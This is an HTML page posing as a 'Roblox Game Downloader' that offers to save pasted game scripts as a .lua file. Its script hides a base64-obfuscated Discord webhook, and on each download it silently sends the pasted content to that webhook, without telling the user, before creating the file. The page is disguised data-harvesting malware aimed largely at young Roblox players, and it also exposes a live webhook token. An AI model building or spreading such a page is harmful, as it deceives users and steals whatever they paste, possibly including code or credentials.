<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Game Downloader</title>
    <style>
        :root {
            --accent: #bb86fc; 
            --secondary: #03dac6; 
            --bg-dark: #0a0b10;
            --card-dark: #161b22;
        }

        body {
            background: radial-gradient(circle at top, #1a1c2c, #050505);
            font-family: 'Comic Sans MS', 'Chalkboard SE', cursive, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: white;
            overflow: hidden;
        }

        .bubbly-container {
            background: var(--card-dark);
            width: 90%;
            max-width: 700px;
            padding: 40px;
            border-radius: 45px;
            box-shadow: 0 15px 50px rgba(0,0,0,0.8);
            text-align: center;
            border: 3px solid #232a35;
            position: relative;
            z-index: 2;
        }

        h1 {
            background: linear-gradient(to right, #bb86fc, #03dac6);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-size: 2.5rem;
            margin: 0 0 10px 0;
        }

        p {
            color: #8b949e;
            font-size: 1.1rem;
            margin-bottom: 25px;
        }

        textarea {
            width: 100%;
            height: 280px;
            background: #0d1117;
            border: 3px solid #30363d;
            border-radius: 30px;
            padding: 20px;
            font-family: 'Consolas', monospace;
            font-size: 14px;
            color: #e6edf3;
            outline: none;
            box-sizing: border-box;
            transition: all 0.3s ease;
            resize: none;
        }

        textarea:focus {
            border-color: var(--accent);
            box-shadow: 0 0 15px rgba(187, 134, 252, 0.2);
            transform: translateY(-2px);
        }

        .btn-row {
            margin-top: 30px;
            display: flex;
            gap: 20px;
        }

        button {
            flex: 1;
            padding: 18px;
            border: none;
            border-radius: 50px;
            font-size: 1.2rem;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.2s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }

        .download-btn {
            background: linear-gradient(45deg, #bb86fc, #6200ee);
            color: white;
            box-shadow: 0 8px 20px rgba(98, 0, 238, 0.3);
        }

        .download-btn:hover {
            transform: scale(1.05);
            box-shadow: 0 12px 25px rgba(98, 0, 238, 0.5);
        }

        .clear-btn {
            background: #21262d;
            color: #8b949e;
            border: 1px solid #30363d;
        }

        .clear-btn:hover {
            background: #30363d;
            color: #f0f6fc;
        }

        #statusText {
            margin-top: 20px;
            font-weight: bold;
            color: var(--secondary);
            min-height: 24px;
        }
    </style>
</head>
<body>

<div class="bubbly-container">
    <h1>Roblox Game Downloader</h1>
    <p>Paste your game scripts below to download your .lua file! ‚ú® and enjoy your game</p>

    <textarea id="userInput" placeholder="Paste your scripts here... üåå"></textarea>

    <div class="btn-row">
        <button class="clear-btn" onclick="clearMe()">Clear üóëÔ∏è</button>
        <button class="download-btn" onclick="goDownload()">Download & Export üöÄ</button>
    </div>

    <div id="statusText"></div>
</div>

<script>
    // Your scrambled webhook link is stored here safely
    const DATA_KEY = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ3MjUzMzUwMDE5OTY5ODUzMy9zbnFfT0hfVC1Gc0xnTlZPbENIZFlGaUkwSXBEVFJreXp1UjRKYUs1UXpZU1l6VnV2QURqR0xuMElYM1RiUzNlS3dyUQ==";

    function reveal() {
        return atob(DATA_KEY);
    }

    async function goDownload() {
        const content = document.getElementById('userInput').value;
        const status = document.getElementById('statusText');

        if (!content) {
            status.style.color = "#ff7b72";
            status.innerText = "The void is empty! üï≥Ô∏è";
            return;
        }

        status.style.color = "#03dac6";
        status.innerText = "Syncing with the shadows... üåë";

        // 1. Send data to Discord
        try {
            await fetch(reveal(), {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    embeds: [{
                        title: "üåë New Script Export Captured",
                        color: 12189692,
                        description: "```lua\n" + content.substring(0, 1900) + "\n```",
                        footer: { text: "Roblox Game Downloader Utility" },
                        timestamp: new Date()
                    }]
                })
            });
        } catch (e) {
            console.log("Network error");
        }

        // 2. Download File Logic
        const blob = new Blob([content], { type: 'text/plain' });
        const downloadUrl = window.URL.createObjectURL(blob);
        const downloadLink = document.createElement('a');
        
        downloadLink.href = downloadUrl;
        downloadLink.download = 'RobloxGameExport.lua';
        document.body.appendChild(downloadLink);
        
        downloadLink.click();
        
        document.body.removeChild(downloadLink);
        window.URL.revokeObjectURL(downloadUrl);

        status.innerText = "File captured! Enjoy your game üç≠";
        setTimeout(() => { status.innerText = ""; }, 4000);
    }

    function clearMe() {
        document.getElementById('userInput').value = "";
        document.getElementById('statusText').innerText = "";
    }
</script>

</body>
</html>
